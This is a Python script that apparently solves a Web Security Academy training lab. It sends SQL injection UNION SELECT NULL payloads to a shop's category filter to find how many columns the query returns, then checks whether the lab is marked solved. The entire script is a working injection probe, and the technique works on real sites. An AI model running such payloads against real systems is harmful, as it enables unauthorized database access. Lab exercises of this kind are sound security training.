import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection UNION attack, determining the number of columns returned by the query')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

for i in range(27, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {('NULL,'*i)[:-1]}-- -")
    print(f"Checking if table has {i} columns.")
    if r.status_code != 500:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")